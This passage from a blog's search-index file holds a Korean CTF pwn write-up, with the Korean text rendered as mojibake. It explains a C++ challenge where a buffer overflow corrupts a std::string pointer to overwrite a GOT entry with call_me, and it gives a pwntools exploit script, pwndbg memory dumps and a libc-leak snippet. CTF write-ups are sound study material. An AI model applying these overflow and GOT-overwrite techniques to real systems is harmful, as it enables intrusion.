c_str</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;c_str: &quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; test.<span class="built_in">c_str</span>();</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>ë¬¸ì œ ê¸°ëŠ¥ ì¤‘ì— <code>_c_str</code>ì— ìž…ë ¥í•˜ëŠ” ë¶€ë¶„ì´ ìžˆëŠ”ë°, ì´ ë•Œ <strong>ìž…ë ¥ê°’ í¬ê¸°ë¥¼ ê²€ì¦í•˜ì§€ ì•Šì•„ BOFê°€ ë°œìƒí•  ìˆ˜ ìžˆë‹¤.</strong></p><p>ì•„ì‰½ê²Œë„(?) canaryê°€ ì¡´ìž¬í•˜ì—¬ ROPëŠ” ë¶ˆê°€ëŠ¥í•˜ë‹¤.<br>í•˜ì§€ë§Œ <code>_c_str</code> ë’¤ì— <code>std::string</code> ë°ì´í„°ë¥¼ ê°€ë¦¬í‚¤ëŠ” ìŠ¤íƒ í¬ì¸í„°ê°€ ì €ìž¥ë˜ì–´ ìžˆë‹¤.</p><p>ë§ˆì¹¨ <code>std::string</code> ë°ì´í„°ë¥¼ getí•˜ê±°ë‚˜ set(ìž…ë ¥)í•˜ëŠ” ê¸°ëŠ¥ì´ ìžˆëŠ”ë°, ì´ ë•Œ (<code>_c_str</code> ë’¤ì— ìœ„ì¹˜í•œ) í¬ì¸í„°ë¥¼ ì´ìš©í•´ì„œ ì ‘ê·¼í•œë‹¤.</p><p>ìš°ë¦¬ëŠ” ì—¬ê¸°ì„œ GOT Overwritingì„ í†µí•´ ì›í•˜ëŠ” í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆë‹¤ëŠ” ê²ƒì„ ëˆˆì¹˜ì±Œ ìˆ˜ ìžˆë‹¤.</p><p><code>call_me</code>ë¼ëŠ” ì¢‹ì€ í•¨ìˆ˜ê°€ ìžˆìœ¼ë‹ˆ ì ë‹¹í•œ í•¨ìˆ˜ë¥¼ ê³¨ë¼ì„œ ì–´ë– í•œ gotë¥¼ <code>call me</code> ë¡œ ë®ì–´ë²„ë¦¬ë©´ ë°”ë¡œ ì‰˜ì„ ë”¸ ìˆ˜ ìžˆì„ ê²ƒ ê°™ë‹¤.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ì–´ë–¤ í•¨ìˆ˜ gotë¥¼ <code>call_me</code>ë¡œ ë®ì„ê¹Œ.. ê³ ë¯¼ì„ í•´ë³´ì•˜ë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;choice: &quot;</span>;</span><br><span class="line">std::cin &gt;&gt; choice;</span><br></pre></td></tr></table></figure><p>ê¸°ëŠ¥ ìˆ˜í–‰ì´ ëì´ ë‚˜ë©´ ì–´ëŠ caseë¬¸ìœ¼ë¡œ ê°ˆ ì§€ ìž…ë ¥ì„ ë°›ëŠ”ë°,<br>í•´ë‹¹ ë¶€ë¶„ì´ IDAì—ì„œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">choice = <span class="number">0</span>;</span><br><span class="line">std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;choice: &quot;</span>);</span><br><span class="line">std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;choice);</span><br></pre></td></tr></table></figure><p>ì´ë ‡ê²Œ ë³´ì—¬ì§€ê³  ìžˆì—ˆë‹¤.</p><p><code>std::char_traits</code>ì˜ gotë¥¼ ë®ì–´ë²„ë¦°ë‹¤ë©´..?</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_c_str</span>(<span class="params">s</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_str</span>(<span class="params">s</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, s)</span><br><span class="line"></span><br><span class="line">set_c_str(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x404048</span>)) <span class="comment"># _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</span></span><br><span class="line">set_str(p64(<span class="number">0x4016de</span>)) <span class="comment"># call_me</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>ë¬¸ì œ í’€ ë‹¹ì‹œì— ì´ê²ƒì €ê²ƒ í•´ë³´ë‹¤ê°€ <code>std::string</code>ì´ ì €ìž¥ë˜ëŠ” êµ¬ì¡°ê°€ ì¡°ê¸ˆ ì´ìƒí•œ ê²ƒë§Œ ëŠë¼ê³  ìžì„¸ížˆ ë³´ì§€ëŠ” ì•Šì•˜ì—ˆëŠ”ë°.. ì§€ê¸ˆ ë‹¤ì‹œ ë³´ë‹ˆ ê·¸ë•Œ ëŠë‚€ ê²Œ í‹€ë¦° ê²ƒì´ ì•„ë‹ˆì—ˆìŒì„ ì•Œê²Œ ë˜ì—ˆë‹¤.</p><h3 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h3><p>ê¸°ë³¸ êµ¬ì¡°ëŠ” ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00h: &lt;Data Pointer&gt; </span><br><span class="line">+08h: &lt;Data Size&gt;</span><br><span class="line">+10h: &lt;Data&gt;  </span><br><span class="line">+18h: &lt;Data&gt;</span><br></pre></td></tr></table></figure><p>ë””ë²„ê±°ë¡œ í™•ì¸í•´ë³´ë©´ ë” ì§ê´€ì ìœ¼ë¡œ í™•ì¸í•  ìˆ˜ ìžˆë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search AAAAAAAAAAAAAAA</span><br><span class="line">[stack]         0x7ffd35bb1700 &#x27;AAAAAAAAAAAAAAA&#x27;</span><br><span class="line">pwndbg&gt; x/4gx 0x7ffd35bb1700-0x10</span><br><span class="line">0x7ffd35bb16f0:0x00007ffd35bb17000x000000000000000f</span><br><span class="line">0x7ffd35bb1700:0x41414141414141410x0041414141414141</span><br></pre></td></tr></table></figure><p>í•´ë‹¹ ë¬¸ì œë¥¼ ì˜ˆì‹œë¡œ ë“¤ìžë©´ ê°’ <code>0x00007ffd35bb1700</code>ê°€ ì €ìž¥ëœ ì£¼ì†Œ <code>0x7ffd35bb16f0</code>ì— <code>std::char_traits</code>ì˜ gotë¥¼ ì“´ë‹¤.<br>ê·¸ë¦¬ê³  í•´ë‹¹ gotì—ë‹¤ê°€ <code>call_me</code>ë¥¼ ì“°ë©´(GOT overwriting), ê²°ë¡ ì ìœ¼ë¡œ <code>std::char_traits</code>ì´ ì‹¤í–‰ë  ë•Œ <code>call_me</code>ê°€ ì‹¤í–‰ëœë‹¤.</p><p>ë‹¤ì‹œ ê¸°ë³¸ êµ¬ì¡°ë¡œ ëŒì•„ì™€ì„œ..Data Sizeê°€ 16(0x10) ì´ìƒì¸ ê²½ìš°ì—” íŠ¹ì´í•˜ê²Œ íž™ì— í• ë‹¹ëœë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x7ffd375efe40</span><br><span class="line">0x7ffd375efe40:0x0000000001e23eb00x0000000000000010</span><br><span class="line">0x7ffd375efe50:0x000000000000001e0x0041414141414141</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000001e23eb0 - 0x10</span><br><span class="line">0x1e23ea0:0x00000000000000000x0000000000000031</span><br><span class="line">0x1e23eb0:0x41414141414141410x4141414141414141</span><br><span class="line">0x1e23ec0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1e23ed0:0x00000000000000000x000000000000f131</span><br><span class="line">0x1e23ee0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>ì‚¬ì‹¤ ì´ ë¬¸ì œì—ì„œëŠ” (ìµìŠ¤í•˜ëŠ”ë°ì—ëŠ” ì•ˆì¼ì§€ë§Œ) ì¶œë ¥í•˜ëŠ” ê¸°ëŠ¥ë„ ì¡´ìž¬í•˜ê¸° ë•Œë¬¸ì— <code>std::string</code>ì˜ ê¸°ë³¸ êµ¬ì¡°ë§Œ ì¶©ë¶„ížˆ ì•Œê³  ìžˆë‹¤ë©´ leakë„ ê°€ëŠ¥í•˜ë‹¤.</p><p><code>_c_str</code>ë¥¼ ìž…ë ¥í•  ë•Œ BOFë¥¼ ì´ìš©í•˜ì—¬ Data Pointerì— leakí•˜ê³  ì‹¶ì€ ì£¼ì†Œ ë„£ê³  ë°”ë¡œ ë’¤ì— ì´ì–´ì§€ëŠ” Data Sizeì— 8ë¡œ ì„¸íŒ…í•´ì£¼ë©´ ëœë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_c_str(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x4040c0</span>) + p64(<span class="number">8</span>))</span><br><span class="line">libc_base = get_str() - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br></pre></td></tr></table></figure><p>ì´ëŸ°ì‹ìœ¼ë¡œ libc leakë„ ê°€ëŠ¥í•˜ê³  pie leakë„ ê°€ëŠ¥í•  ê²ƒì´ë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732#%E5%9F%BA%E6%9C%AC%E6%A7%8B%E9%80%A0">ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2021&#x2F;11&#x2F;30&#x2F;235732#åŸºæœ¬æ§‹é€ </a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Cake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
